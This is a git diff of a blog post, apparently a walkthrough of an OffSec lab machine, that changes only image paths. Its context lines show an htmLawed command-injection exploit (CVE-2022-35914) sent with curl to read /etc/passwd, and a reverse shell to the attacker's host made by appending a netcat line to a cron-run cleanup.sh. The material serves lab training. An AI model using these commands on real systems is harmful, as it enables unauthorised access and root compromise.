@@ -7,7 +7,7 @@ image = "categories/offsec/offsec-edit.png"
 +++
 
 
-![](1.png)
+![](content/post/offsec-law/1.png)
 
 
 ## Description
@@ -30,25 +30,25 @@ image = "categories/offsec/offsec-edit.png"
 sudo $(which autorecon) 192.168.195.190
 ```
 
-![](2.png)
+![](content/post/offsec-law/2.png)
 
 
 ---
 
 htmLawed 1.2.5 is running on port 80. 
 
-![](3.png)
+![](content/post/offsec-law/3.png)
 
 
 We find the htmLawed version 1.2.5 [GLPI htmlawed (CVE-2022-35914)](https://mayfly277.github.io/posts/GLPI-htmlawed-CVE-2022-35914/) exploit, but it fails. <br>[Video timestamp 1:01](https://www.youtube.com/watch?v=LkZetyoH2xc&t=61s)
 
 Expected outcome of exploit (see image below) 
 
-![](4.png)
+![](content/post/offsec-law/4.png)
 
 Our outcome (see image below)
 
-![](5.png)
+![](content/post/offsec-law/5.png)
 
 
 Run the exploit at http://192.168.195.190/vendor/htmlawed/htmlawed/htmLawedTest.php using `curl`. Still receive a 404 "Not Found" error. 
@@ -58,7 +58,7 @@ curl -s -d 'sid=foo&hhook=exec&text=cat /etc/passwd' -b 'sid=foo' http://192.168
 
 ```
 
-![](6.png)
+![](content/post/offsec-law/6.png)
 
 ---
 
@@ -70,7 +70,7 @@ Run the exploit at http://192.168.195.190 instead, and it works.
 <br>[Video timestamp 2:25](https://www.youtube.com/watch?v=LkZetyoH2xc&t=145s)
 
 
-![](7.png)
+![](content/post/offsec-law/7.png)
 
 ---
 
@@ -108,7 +108,7 @@ export TERM=xterm-256color
 stty rows 67 columns 318
 ```
 
-![](9.png)
+![](content/post/offsec-law/9.png)
 
 ---
 
@@ -128,7 +128,7 @@ ls -la
 ```
 
 
-![](8.png)
+![](content/post/offsec-law/8.png)
 
 ---
 
@@ -147,7 +147,7 @@ cd ../ && ls -la
 cat cleanup.sh
 ```
 
-![](10.png)
+![](content/post/offsec-law/10.png)
 
 
 
@@ -158,14 +158,14 @@ We check `cron jobs` of root running `cleaning.sh`, but find nothing interesting
 ps aux | grep cleanup.sh
 ```
 
-![](12.png)
+![](content/post/offsec-law/12.png)
 
 
 ```bash
 cat /etc/cron.d/php
 ```
 
-![](11.png)
+![](content/post/offsec-law/11.png)
 
 ---
 
@@ -180,7 +180,7 @@ cd /tmp && wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/
 chmod +x pspy64 && ./pspy64
 ```
 
-![](13.png)
+![](content/post/offsec-law/13.png)
 
 ---
 
@@ -194,4 +194,4 @@ echo "nc -c bash 192.168.45.223 4444" >> /var/www/cleanup.sh
 nc -lvnp 4444
 ```
 
-![](14.png)
+![](content/post/offsec-law/14.png)
